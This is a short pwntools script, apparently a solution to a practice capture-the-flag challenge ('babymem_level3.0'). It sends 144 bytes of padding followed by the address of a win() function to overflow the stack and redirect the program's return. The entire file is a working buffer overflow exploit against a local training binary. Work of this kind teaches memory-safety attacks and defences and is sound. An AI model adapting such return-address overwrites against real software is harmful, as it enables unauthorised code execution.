# memlvl3.py
from pwn import *

payload = b"A"*144  # Buffer to fill up to the return address
payload += p64(0x402146)  # Address of the win() function in little-endian

# Create the process
proc = process('/challenge/babymem_level3.0')

# Send the payload
proc.sendline(payload)

# Receive output
print(proc.recvall().decode())

